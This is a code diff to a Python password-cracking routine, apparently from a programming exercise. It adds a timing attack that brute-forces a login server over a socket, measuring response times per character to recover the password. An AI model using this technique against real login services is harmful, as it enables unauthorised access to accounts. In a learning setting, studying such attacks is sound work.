@@ -1,5 +1,6 @@
 from itertools import chain
 import json
+import time
 import socket
 from string import ascii_letters
 
@@ -95,12 +96,26 @@ def get_password_json(address, response_length=4096, timed=False):
         login_dict["password"] = ""
         while response != "Connection success!":
             correct_part = login_dict["password"]
+            max_time = 0
+            max_letter = ""
             for letter in password_letters:
                 login_dict["password"] = correct_part + letter
+                if timed:
+                    start = time.time()
                 response = _send_recv_json(client, login_dict, response_length)["result"]
-                if response == "Exception happened during login" or response == "Connection success!":
+                if response == "Connection success!":
                     break
-
+                # if timed, the old exit strategy is no longer applied and every character is measured
+                if timed:
+                    stop = time.time()
+                    if max_time < stop - start:
+                        max_time = stop - start
+                        max_letter = letter
+                    continue
+                elif response == "Exception happened during login":
+                    break
+            if timed and response != "Connection success!":
+                login_dict["password"] = correct_part + max_letter
         return json.dumps(login_dict, indent=4)
 
 
